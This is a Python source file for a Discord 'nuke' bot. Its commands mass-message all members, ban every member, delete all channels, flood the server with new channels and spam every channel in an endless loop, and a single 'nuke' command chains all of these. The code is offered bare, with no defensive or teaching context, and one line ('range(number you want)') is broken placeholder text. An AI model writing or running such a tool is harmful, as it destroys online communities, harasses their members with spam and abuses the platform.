import os
import discord
import time
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
intents.members = True

client = commands.Bot(intents=intents, command_prefix="!")

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))

@client.command()
async def dm_all(ctx, *, message):
    count = 0
    for member in ctx.guild.members:
        try:
            await member.send(message)
            count += 1
            if count >= 100:
                time.sleep(60)
                count = 0
            else:
                continue
        except:
            pass

@client.command()
async def ban_all(ctx):
    count = 0
    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member)
            count += 1
        except:
            pass
    print("Ban members : " + str(count))

@client.command()
async def delete_all(ctx):
    count = 0
    channels = ctx.guild.channels
    for chan in channels:
        try:
            await chan.delete()
            count += 1
        except:
            pass
    print("Deleted Channel : " + str(count))

@client.command()
async def create_all(ctx,name,nombre):
    for k in range(int(nombre)):
        try:  
            await ctx.guild.create_text_channel(name)
        except:
            pass    

@client.command()
async def spam_ping(ctx):
    message = "None"
    spam = True
    while spam == True:

        for chan in ctx.guild.channels:
            await chan.send(message)

@client.command()  
async def nuke(ctx):
    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(member)
        except:
            pass

    channels = ctx.guild.channels
    for chan in channels:
        try:
            await chan.delete()
        except:
            pass

    for k in range(number you want):
        try:  
            await ctx.guild.create_text_channel("None")
        except:
            pass 
    
    message = "None"
    spam = True
    while spam == True:

        for chan in ctx.guild.channels:
            await chan.send(message)
    

client.run("TOKEN")